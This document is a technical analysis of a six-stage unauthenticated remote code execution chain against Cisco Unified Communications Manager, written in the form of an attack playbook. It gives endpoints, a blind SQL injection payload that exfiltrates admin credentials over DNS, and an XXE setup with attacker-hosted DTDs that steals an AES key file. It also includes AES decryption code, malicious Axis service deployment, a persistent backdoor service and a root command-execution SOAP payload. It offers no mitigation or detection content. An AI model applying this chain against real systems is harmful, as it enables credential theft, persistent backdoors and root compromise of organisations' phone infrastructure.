# Cisco CUCM RCE Chain - Technical Analysis

## Overview

This vulnerability chain combines multiple security flaws in Cisco Unified Communications Manager (CUCM) to achieve unauthenticated remote code execution with root privileges. The attack chain consists of six sequential stages that progressively escalate privileges from information disclosure to full system compromise.

## Attack Chain Architecture

### Stage 1: SQL Injection via Authorization Header

**Endpoint**: `/ssosp/user/whoami`

**Vulnerability Type**: Blind SQL Injection with DNS Exfiltration

**Root Cause**: The Authorization header parameter is directly concatenated into SQL queries without proper sanitization or parameterization.

**Technical Details**:

The application constructs SQL queries using user-supplied input from the Authorization header. By injecting UNION-based SQL statements encoded in Base64, attackers can extract data from the database through DNS requests.

The injection payload targets two database tables:
- `applicationuser`: Contains administrator usernames
- `credential`: Stores encrypted password hashes

**Exploitation Method**:

1. Generate random prefix for DNS callback identification
2. Construct SQL payload with conditional logic based on character matching
3. Base64 encode the payload and send via Authorization header
4. Monitor DNS exfiltration service for callback indicating successful character match
5. Iterate through all positions to reconstruct complete username and password hash

**Example Payload Structure**:
```
1111 union ALL SELECT CASE WHEN LEFT(name, {position}) = '{prefix}' 
THEN '{random_prefix}.{dns_domain}' ELSE NULL END AS result 
FROM applicationuser WHERE LEFT(name, {position}) = '{prefix}':sssss
```

**Concurrency**: Multi-threaded implementation supports up to 150 concurrent workers for rapid credential extraction.

---

### Stage 2: XXE for Encryption Key Extraction

**Endpoint**: `/changecredential/ChangeCredentialServlet`

**Vulnerability Type**: XML External Entity (XXE) Injection

**Root Cause**: The XML parser processes external entity references without restricting file system access or network connections.

**Technical Details**:

The ChangeCredentialServlet accepts XML input that is parsed with an vulnerable XML processor. By supplying a malicious DTD file, attackers can trigger external entity expansion that reads sensitive files from the filesystem.

**Attack Vector**:

1. Send POST request with minimal XML payload to trigger parsing
2. XML parser attempts to load DTD file from server specified in Host header
3. **Critical requirement**: Malicious DTD file must be placed at `/changecredential/xml/CredentialChange.dtd` on attacker's server
4. Server attempts to load `http://{host}/changecredential/xml/CredentialChange.dtd`
5. CredentialChange.dtd references external 2.dtd file, defining entity that reads `/usr/local/platform/.security/CCMEncryption/keys/dkey.txt`
6. Entity expansion triggers HTTP request to attacker server containing file contents
7. Extract AES encryption key from HTTP logs

**Server Configuration Requirements**:

Attacker must create the following directory structure on their server:
```
/changecredential/xml/CredentialChange.dtd  (references external malicious DTD)
/2.dtd  (actual payload, reads file and exfiltrates)
```

**Key File Purpose**: Contains the AES decryption key used to protect administrator credentials in the database.

---

### Stage 3: Credential Decryption

**Encryption Algorithm**: AES-CBC with PKCS7 padding

**Key Source**: Extracted dkey.txt from Stage 2

**Decryption Process**:

1. Convert hexadecimal key string to binary format
2. Split encrypted password into IV (first 16 bytes) and ciphertext (remaining bytes)
3. Initialize AES cipher in CBC mode with extracted key and IV
4. Decrypt ciphertext and remove PKCS7 padding
5. Obtain plaintext administrator password

**Code Implementation**:
```python
iv = encrypted_password[:16]
encrypted_data = encrypted_password[16:]
cipher = AES.new(keydataDkey, AES.MODE_CBC, iv)
decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
```

---

### Stage 4: Apache Axis Service Deployment

**Endpoint**: `/ccmadmin/emergencyNotificationWizard.do`

**Vulnerability Type**: Improper Input Validation Leading to Service Deployment

**Root Cause**: The emergency notification wizard accepts URL parameters that are incorporated into WSDL deployment descriptors without adequate validation.

**Technical Details**:

Administrators can deploy custom Apache Axis web services through the emergency notification interface. The ipAddr parameter allows injection of complete WSDL XML that defines new SOAP services.

**Deployment Mechanism**:

1. Authenticate with extracted administrator credentials
2. Access emergency notification wizard
3. Inject URL-encoded WSDL XML into ipAddr parameter
4. Deploy Axis service named "ELService66" using javax.el.ELProcessor class
5. Configure service to allow all methods for maximum flexibility

**WSDL Injection Payload**:
The injected WSDL defines a service that utilizes ELProcessor for expression language evaluation, enabling arbitrary Java code execution.

**Authentication Requirement**: Valid session cookie obtained from administrator login.

---

### Stage 5: Lateral Movement via Freemarker RCE

**Endpoint**: `/webdialer/services/ELService66`

**Vulnerability Type**: Remote Code Execution via Template Engine

**Root Cause**: Apache Axis service exposes Freemarker template engine's Execute utility class without access controls.

**Technical Details**:

The deployed ELService66 endpoint processes SOAP requests containing Freemarker template expressions. The `freemarker.template.utility.Execute` class allows execution of system commands through template directives.

**Attack Progression**:

1. Send SOAP request to ELService66 with Freemarker payload
2. Payload executes Java code to deploy second Axis service on localhost:81
3. Second service named "fmService" uses Execute class directly
4. Achieves lateral movement within internal network

**Freemarker Payload**:
```xml
'util:eval' template executes JavaScript that:
- Creates HttpURLConnection to localhost:81
- Deploys fmService with freemarker.template.utility.Execute
- Returns deployment confirmation
```

**Purpose**: Establishes persistent backdoor service accessible without external authentication.

---

### Stage 6: Root Command Execution

**Endpoint**: `/controlcenterservice/services/fmService`

**Vulnerability Type**: Unrestricted Command Execution

**Root Cause**: The fmService exposes Execute utility that runs system commands with application server privileges (root).

**Technical Details**:

The fmService accepts SOAP requests with command strings that are executed directly by the operating system. Since CUCM runs as root, all commands execute with highest privileges.

**Command Execution Flow**:

1. Craft SOAP envelope with target command in arguments
2. Include Basic authentication header with previously extracted credentials
3. Send POST request to fmService endpoint
4. Server executes command and returns output
5. Results written to web-accessible file for retrieval

**SOAP Payload Structure**:
```xml
<util:exec>
  <arguments>
    <string>{command}</string>
  </arguments>
</util:exec>
```

**Result Retrieval**: Commands write output to `/usr/local/thirdparty/jakarta-tomcat/webapps/1.js` which is accessible via HTTP GET request.

---

## Complete Attack Sequence

1. **Reconnaissance**: Identify CUCM instance and verify DNS exfiltration capability
2. **Credential Harvesting**: Extract administrator username and encrypted password via SQLi
3. **Key Acquisition**: Obtain AES decryption key through XXE
4. **Password Recovery**: Decrypt administrator password
5. **Initial Foothold**: Deploy Axis web service with ELProcessor
6. **Persistence**: Establish internal fmService backdoor
7. **Privilege Escalation**: Execute arbitrary commands as root
8. **Data Exfiltration**: Retrieve command output via HTTP
